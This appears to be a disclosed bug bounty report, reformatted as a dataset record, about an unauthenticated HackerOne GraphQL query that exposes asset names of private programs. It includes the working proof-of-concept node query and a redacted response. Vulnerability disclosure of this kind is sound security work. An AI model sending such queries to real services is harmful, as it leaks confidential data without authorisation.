title: Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/{id}`
content:
Summary:
Hi team, I understand what's going on
Description:
Just a recent update gives the results of private programs
### Steps To Reproduce
Without authorization
GraphQL:
{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}
Answer:
{"data":{"node":{"id":"Z2lkOi8vaGFja2Vyb25lL1BvbGljeVBhZ2VBc3NldEdyb3Vwc0luZGV4OjpQb2xpY3lQYWdlQXNzZXRHcm91cC8zOTgxLTQxMjg3","name":"██████"}}}
This is Asset program - █████████
Thanks!
Impact
Disclosing Sсope(Assets) in Private Programs
steps: Send a GraphQL query to the endpoint without authorization: {"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}
Observe the response containing sensitive information about a private program's assets.
vuln_description: This vulnerability allows unauthorized disclosure of private program assets through a GraphQL endpoint. By querying a specific node ID, an attacker can retrieve sensitive information such as asset names without proper authorization.
reason: The attack involves a single straightforward GraphQL query to an endpoint that does not enforce proper authorization checks. There are no complex interactions or state manipulations required.
